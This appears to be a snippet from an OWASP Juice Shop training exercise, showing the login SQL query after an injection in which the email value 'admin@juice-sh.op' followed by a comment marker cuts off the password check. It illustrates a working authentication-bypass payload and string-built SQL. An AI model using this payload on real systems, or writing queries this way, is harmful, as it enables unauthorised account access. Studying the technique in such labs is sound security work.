SELECT
    *
FROM
    Users
WHERE
    email = 'admin@juice-sh.op' --' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL